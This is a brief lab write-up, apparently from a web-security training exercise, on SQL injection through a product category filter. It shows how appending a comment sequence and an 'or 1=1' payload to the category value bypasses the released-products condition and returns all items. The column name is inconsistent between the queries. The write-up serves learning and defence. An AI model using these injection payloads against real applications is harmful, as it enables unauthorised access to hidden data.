# SQL injection - product category filter

The query to retrieve details of the products should be:   
`select * from products where category = 'Gifts' and released = 1`  
-> released = 1 is to hide the products that are not released.  
-> released = 0 is to present the unreleased products.  

Known that no defenses against SQL injection attacks, so we can use -- to comment the rest of the query:  
`select * from products where category = 'Gifts' -- ' and release = 1`  

To display all the products in any category:  
`select * from products where category = 'Gifts' or 1=1 -- ' and release = 1`
-> because 1 is always equal to 1, the query will return all items.
